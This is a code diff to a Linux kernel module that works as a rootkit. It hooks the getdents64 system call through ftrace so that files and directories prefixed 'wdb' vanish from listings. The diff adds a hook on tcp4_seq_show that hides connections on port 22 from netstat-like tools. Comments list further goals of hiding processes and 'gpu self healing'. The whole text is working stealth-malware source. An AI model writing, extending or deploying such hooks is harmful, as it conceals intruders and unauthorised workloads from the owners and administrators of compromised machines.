@@ -6,10 +6,15 @@
 #include <linux/version.h>
 #include <linux/namei.h>
 #include <linux/dirent.h>
+#include <net/sock.h>
 
 #include "ftrace_helper.h"
 
+/* file to hide */
 #define PREFIX "wdb"
+
+/* port to hide */
+#define PORT 22
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("otitoko");
@@ -21,9 +26,10 @@ MODULE_VERSION("0.1");
 #endif
 
 #ifdef PTREGS_SYSCALL_STUBS
-static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 
-//hide file
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
 //hide network connections/ports
 //hide processes
 //gpu self healing
@@ -69,6 +75,8 @@ asmlinkage int hooked_kill(const struct pt_regs *regs){
 static struct ftrace_hook hooks[]={HOOK("__x64_sys_kill", hooked_kill, &orig_kill)};
 */
 
+/* hiding directory entries meaning files AND directories */
+/* only have a 64 bit implementation because low on time */
 asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	unsigned long offset=0;
 	struct linux_dirent64 __user *dirent=(struct linux_dirent64*)regs->si;
@@ -117,11 +125,24 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs){
 	return ret;
 
 }
+
+/* hiding open ports. hook for netstat and other similar tools, not including ss */
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
+	struct sock *sk=v;
+
+	if((sk!=0x1)&&(sk->sk_num==0x16))
+			return 0;
+	
+	return orig_tcp4_seq_show(seq,v);
+}
+
+
 #else
 #endif
 
 static struct ftrace_hook hooks[] = {
 	HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
+	HOOK("tcp4_seq_show",hook_tcp4_seq_show,&orig_tcp4_seq_show),
 };
 static int __init basic_init(void){
 
